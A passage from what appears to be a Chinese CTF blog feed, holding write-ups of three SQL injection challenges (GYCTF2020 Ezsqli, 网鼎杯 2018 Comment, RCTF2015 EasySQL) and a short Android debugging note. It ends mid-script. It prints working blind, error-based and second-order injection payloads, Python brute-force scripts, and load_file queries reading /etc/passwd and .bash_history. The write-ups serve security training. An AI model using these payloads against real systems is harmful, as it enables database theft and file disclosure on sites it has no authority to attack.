        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[孙笑川|二分法崩溃]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Ezsqli/image-20210709135215391.png" alt="image-20210709135215391"></p><p>开局孙笑川，晦气，真的晦气。</p><p>这题貌似做过，但是我忘了</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>有注入检测，所以先fuzz一下。</p><p><code>id=sleep</code>不会被检测，<code>id=1sleep</code>才会</p><p>检测字符</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Ezsqli/image-20210709152541788.png" alt="image-20210709152541788"></p><p><code>id=1^0</code> =&gt;Nu1L</p><p><code>id=1^1</code> =&gt;Error Occured When Fetch Result.</p><p>异或盲注，先用脚本跑个库名</p><pre class="line-numbers language-none"><code class="language-none">give_grandpa_pa_pa_pa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下里的问题是<code>information_schema.tables</code>被检测了，可以换成<code>sys.schema_table_statistics_with_buffer</code></p><p>跑出表名</p><pre class="line-numbers language-none"><code class="language-none">users233333333333333,f1ag_1s_h3r3_hhhhh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跑的时候才发现把数据库名<code>give_grandpa_pa_pa_pa</code>也给检测了……</p><p>因为<code>information_schema</code>被检测了，不能继续跑列名，所以接下来只能无列名注入</p><h3 id="ASCII偏移"><a href="#ASCII偏移" class="headerlink" title="ASCII偏移"></a>ASCII偏移</h3><p>因为检测join，所以只能用ascii偏移跑</p><pre class="line-numbers language-none"><code class="language-none">select (select &#39;b&#39;) &gt; (select &#39;abcdefg&#39;)#返回1select (select &#39;b&#39;) &gt; (select &#39;c&#39;)#返回0select (SELECT &#39;bb&#39;) &gt; (select &#39;ba&#39;)#返回1select (SELECT 1,&#39;bb&#39;) &gt; (select 1,&#39;ba&#39;)#返回1select (SELECT 1,&#39;bb&#39;) &gt; (select 2,&#39;ba&#39;)#返回0select (SELECT &#39;1&#39;) &gt; (select &#39;a&#39;)#返回0select (SELECT 1) &gt; (select &#39;a&#39;)#返回1select (SELECT 1) &#x3D; (select &#39;1&#39;)#返回1select (SELECT 1) &gt; (select &#39;~&#39;)#返回1select (SELECT &#39;flag&#39;) &gt; (select &#39;f&#39;)#返回1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>比较的时候，1=’1’，但’1’&lt;’a’，且1&gt;’a’，经测可知，数字&gt;字符。</p></blockquote><p>于是构造payload，先测出<code>f1ag_1s_h3r3_hhhhh</code>表的列数</p><pre class="line-numbers language-none"><code class="language-none">1^((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh)) &#x3D;&gt;Error Occured When Fetch Result.1^((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 &#x3D;&gt;Nu1L<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以列数为2</p><p>然后就是跑脚本吧。</p><p>无语了，折腾了好几个小时，发现这到底没法写成平时用的二分法代码，只能老老实实一个一个跑。真无语了，浪费那么多时间。</p><pre class="line-numbers language-none"><code class="language-none">select (SELECT &#39;flag&#39;) &gt; (select &#39;f&#39;)#这是返回1的，二分脚本中定值&gt;变量形式要求这个返回0，所以没法整。换成定值&lt;变量形式，又受盲注限制，无法正常结束二分查找循环。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 十六进制转换 fl ==> 0x666c，可以避免一些如"fla""这种符号问题导致执行错误以及检测bypass</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> res    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"http://c9046ab0-ea20-4cee-b30d-f37009ba61da.node4.buuoj.cn/"</span>s <span class="token operator">=</span> <span class="token string">""</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> s <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">"1^((1,&#123;0&#125;)>(select * from f1ag_1s_h3r3_hhhhh))^1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b"Nu1L"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            last <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 'F'&lt;'FLAG','G'>'FLAG',所以要减1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>buuctf上flag还得转成小写才能提交。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 无列名注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android崩溃笔记</title>
      <link href="/p/288737676.html"/>
      <url>/p/288737676.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下学习安卓时逐渐崩溃的心路历程。</p><p>安卓是白天学的，人是晚上走的。</p><p>半吊子学android是这样的，每个问题都让我啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊的崩溃乱叫。</p><h2 id="android-content-res-Resources-NotFoundException-String-resource-ID"><a href="#android-content-res-Resources-NotFoundException-String-resource-ID" class="headerlink" title="android.content.res.Resources$NotFoundException: String resource ID"></a>android.content.res.Resources$NotFoundException: String resource ID</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">followedNumTV<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFollowedNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于<code>getFollowedNum()</code>返回的是integer，setText又只接收string，偏偏ide没提示！！！</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">followedNumTV<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFollowedNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="调用org-json-JSONObject-报错Stub"><a href="#调用org-json-JSONObject-报错Stub" class="headerlink" title="调用org.json.JSONObject 报错Stub!"></a>调用org.json.JSONObject 报错Stub!</h2><p>这玩意只能在安卓中运行，不能直接用java运行。</p><h2 id="网络请求用Retrofit2-Rxjava2"><a href="#网络请求用Retrofit2-Rxjava2" class="headerlink" title="网络请求用Retrofit2+Rxjava2"></a>网络请求用Retrofit2+Rxjava2</h2><p>安卓中不允许主线程执行网络请求，所以要另寻他法。</p><p>而Retrofit2中也有<code>.enqueue()</code>来进行异步操作，但处理返回值似乎有点麻烦，于是用Rxjava2来进行线程调度。</p><p>好文共赏：<a href="https://gank.io/post/560e15be2dca930e00da1083">给 Android 开发者的 RxJava 详解</a></p><h2 id="JSON处理"><a href="#JSON处理" class="headerlink" title="JSON处理"></a>JSON处理</h2><p>用gson或者fastjson。</p><p>一开始拒绝建javabean，用fastjson将返回值转map折腾了很久。</p><p>最终败给了异步请求，还是得建javabean。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> DEBUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2018]Comment</title>
      <link href="/p/2243940947.html"/>
      <url>/p/2243940947.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[留言|评论|发帖]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706193426485.png" alt="image-20210706193426485"></p><p>这题真的难。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>发帖要登录，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706193537032.png" alt="image-20210706193537032"></p><p>爆破一下，密码是zhangwei666。</p><h3 id="1-git泄漏"><a href="#1-git泄漏" class="headerlink" title="1.git泄漏"></a>1.git泄漏</h3><p>扫目录扫出/.git，用githack下载一下源码，发现是不全的。</p><p><code>git log</code>一下，是空的。</p><p><code>git log --reflog</code>有不少东西</p><p>在题目F12 CONSOLE处也能看到提示。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706194210821.png" alt="image-20210706194210821"></p><blockquote><p><code>git log --reflog</code> 查看所有分支的所有操作记录（包括已经被删除的commit记录和reset的操作）</p></blockquote><p><code>git reset --hard commit记录</code>，还原一下源码</p><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706194036881.png" alt="image-20210706194036881"></p><p><code>addslashes()</code>一下就联想到昨天做的一道题，利用加的<code>\</code>来注释后面一个单引号。不过这题似乎没机会</p><p>在此测试下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706195931843.png" alt="image-20210706195931843"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706195938395.png" alt="image-20210706195938395"></p><p>可知</p><blockquote><p>数据库会自动清除反斜杠</p></blockquote><p>所以，如果<code>addslashes()</code>处理的值往数据库里走一圈，相当于没处理。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706200140233.png" alt="image-20210706200140233"></p><p><code>category</code>从数据库中取值，漏洞点就在这</p><p>梳理下二次注入逻辑</p><p>注意看这句话，这样换行写sql语句，那写入的sql语句也是有换行符存在的，所以用<code>#</code>来注释后面的内容就不好使了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706202819141.png" alt="image-20210706202819141"></p><p>第一次，在catagory里输入</p><pre class="line-numbers language-none"><code class="language-none">1&#39;,content&#x3D;user(),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在评论content里输入<code>*/#</code>就会形成入下图所示代码：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706202627995.png" alt="image-20210706202627995"></p><p>第二行的<code>/*</code>与第三行的<code>*/</code>遥相呼应，将中间的给注释了，而第三行的<code>#</code>，将后面的<code>单引号</code>和<code>逗号</code>给注释了。</p><p>第四行还有一句不能忽略，所以那个逗号也需要加。</p><p>于是，注入成立。</p><p>这里给了个root权限，也是一个提示</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203110292.png" alt="image-20210706203110292"></p><blockquote><p>说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。</p></blockquote><p>读取/etc/passwd</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203558299.png" alt="image-20210706203558299"></p><p>一般设置web的都是www用户，所以找www。</p><p>找到www用户目录<code>/home/www/</code></p><p>读下历史命令记录</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>home<span class="token operator">/</span>www<span class="token operator">/</span><span class="token punctuation">.</span>bash_history'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>.bash_history保存了当前用户使用过的历史命令</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203803113.png" alt="image-20210706203803113"></p><p>删除了<code>/var/www/html/.DS_Store</code></p><p>但是没删<code>/tmp/html/.DS_Store</code></p><blockquote><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符</p></blockquote><p>所以读取下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>tmp<span class="token operator">/</span>html<span class="token operator">/</span><span class="token punctuation">.</span>DS_Store'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204250029.png" alt="image-20210706204250029"></p><p>用<code>hex()</code>转换下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select hex(load_file('</span><span class="token operator">/</span>tmp<span class="token operator">/</span>html<span class="token operator">/</span><span class="token punctuation">.</span>DS_Store'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一大堆16进制，解个码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204545320.png" alt="image-20210706204545320"></p><p>最后读取下</p><pre class="line-numbers language-none"><code class="language-none">1&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不加<code>hex()</code>，那还得查看源码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204946881.png" alt="image-20210706204946881"></p><p>游戏结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RCTF2015]EasySQL</title>
      <link href="/p/929805825.html"/>
      <url>/p/929805825.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152613750.png" alt="image-20210706152613750"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152622228.png" alt="image-20210706152622228"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>关键词:[二次注入|先登后改|改密|正则]</p><p>注册的时候有过滤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152941359.png" alt="image-20210706152941359"></p><p>跑个fuzz试试，限制了这些字符：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706160422510.png"></p><p>注册个账号为<code>1&quot;</code></p><p>改密码提示：</p><pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看来是双引号闭合。</p><p>二次注入逻辑梳理：注册账户写入sql注入代码=&gt;修改密码触发sql注入代码</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162112767.png" alt="image-20210706162112767"></p><h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4><p>flag不在flag表中，在users表中，注意，如果是burpsuite或hackbar发包，记得将&amp;&amp;转码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162645199.png" alt="image-20210706162645199"></p><h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后……</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706164756534.png" alt="image-20210706164756534"></p><p>要么把flag搜索出来，要么写脚本慢慢跑.</p><h5 id="1-筛选"><a href="#1-筛选" class="headerlink" title="1.筛选"></a>1.筛选</h5><pre class="line-numbers language-none"><code class="language-none">#正序1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))))%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706171255380.png" alt="image-20210706171255380"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#逆序</span><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>reverse<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token operator">regexp</span><span class="token punctuation">(</span><span class="token string">'^f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706170925330.png" alt="image-20210706170925330"></p><p>逆序输出下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'dd286a765312-4e9b-bca4-fc93-77'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#77-39cf-4acb-b9e4-213567a682dd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>组合下flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;d6fd7577-39cf-4acb-b9e4-21           77-39cf-4acb-b9e4-213567a682dd&#125;flag&#123;d6fd7577-39cf-4acb-b9e4-213567a682dd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="2-抄个网上的脚本"><a href="#2-抄个网上的脚本" class="headerlink" title="2.抄个网上的脚本"></a>2.抄个网上的脚本</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl_reg <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/register.php'</span>url_log <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/login.php'</span>url_change <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/changepwd.php'</span>pre <span class="token operator">=</span> <span class="token string">'mochu7"'</span><span class="token comment">#逆序闭合</span>suf <span class="token operator">=</span> <span class="token string">"')))),1))#"</span><span class="token comment">#正序闭合</span><span class="token comment">#suf = "'))),1))#"</span>s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz1234567890'</span>s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> name<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'email'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_reg<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> name<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_log<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">changepwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'oldpass'</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'newpass'</span> <span class="token 